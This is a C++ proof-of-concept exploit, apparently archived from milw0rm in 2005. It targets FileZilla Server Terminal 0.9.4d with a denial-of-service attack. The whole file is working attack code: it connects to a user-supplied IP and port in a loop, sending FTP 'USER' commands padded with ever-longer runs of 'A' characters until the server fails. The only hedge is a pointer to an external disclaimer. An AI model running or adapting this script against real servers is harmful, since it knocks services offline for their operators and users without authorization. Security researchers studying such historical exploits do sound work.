/*
FileZillaDoS.cpp
FileZilla Server Terminal 0.9.4d DoS PoC by Inge Henriksen.
Read the disclaimer at http://ingehenriksen.blogspot.com before using.
Made to work with Microsoft(R) Visual C++(R), to use link "WS2_32.lib".
*/

#include "stdafx.h"
#include <iostream>
#include "Winsock2.h"

#define BUFFSIZE 10000
#define ATTACK_BUFFSIZE 5000

using namespace std;

int _tmain(int argc, _TCHAR* argv[])
{
       cout << "FileZilla Server Terminal 0.9.4d DoS PoC by Inge Henriksen." << endl;
       cout << "Read the disclaimer at http://ingehenriksen.blogspot.com before using." << endl;
       if (argc!=3)                    // Exit if wrong number of arguments
       {
               cerr << "Error: Wrong number of arguments" << endl;
               cout << "Usage: " << argv[0] << " <Target IP> <Target Port>" << endl;
               cout << "Example: " << argv[0] << " 192.168.2.100 21" << endl;
               return (-1);
       }

       in_addr IPAddressData;
       __int64 counterVal;
       char* bufferData;
       char* attackStringData;
       SOCKET sock;
       sockaddr_in sinInterface;

       WSADATA wsaData;
       int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);             // Use Winsock version 2.2
       if (iResult != NO_ERROR)
       {
               cerr << "Error: WSAStartup() failed" << endl;
               return(-1);
       }

       int recvRet;
       char tmpBuffer[BUFFSIZE];
       char tmpAttackBuffer[ATTACK_BUFFSIZE];
       tmpAttackBuffer[0] = 'U';
       tmpAttackBuffer[1] = 'S';
       tmpAttackBuffer[2] = 'E';
       tmpAttackBuffer[3] = 'R';
       tmpAttackBuffer[4] = ' ';

       int i;
       int j=5;
       for (i=j;i<ATTACK_BUFFSIZE-6;i++)
       {
               int k;
               for(k=j;k<=i;k++)
               {
                       tmpAttackBuffer[k] = 'A';
               }
               tmpAttackBuffer[k] = '\n';
               tmpAttackBuffer[k+1] = '\0';

               sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP );
               if ((int)(sock)==-1)
               {
                       cerr << "Error: Could not create socket" << endl;
                       return(-1);
               }

               sinInterface.sin_family = AF_INET;
               sinInterface.sin_addr.s_addr = inet_addr(argv[1]);
               sinInterface.sin_port = htons(atoi(argv[2]));

               if ((connect(sock,(sockaddr*)&sinInterface ,sizeof(sockaddr_in))!=SOCKET_ERROR))
               {
                       int sendResult = send( sock, tmpAttackBuffer , (int)strlen(tmpAttackBuffer), 0);
                       cout << "Sent " << strlen(tmpAttackBuffer) << " characters" << endl;
                       if ( sendResult != SOCKET_ERROR )
                       {
                               recvRet = SOCKET_ERROR;

                               for (int i=0;i<BUFFSIZE;i++)
                                       tmpBuffer[i]=(char)0;

                               recvRet = recv( sock, tmpBuffer , BUFFSIZE-1, 0 );
                               if ( recvRet == SOCKET_ERROR )
                                       cerr << "Error: recv() failed" << endl;
                               else
                                       cout << "Response is: " << endl << tmpBuffer << endl;;
                       }
                       else
                               cerr << "Error: send() failed" << endl;

                       if (shutdown(sock,0)==SOCKET_ERROR)
                               cerr << "Error: shutdown() failed" << endl;
               }
               else
                       cerr << "Error: connect() failed" << endl;

               if (closesocket(sock)==SOCKET_ERROR)
                       cerr << "Error: closesocket() failed" << endl;

       }       // End for loop

       return 0;
}

// milw0rm.com [2005-11-21]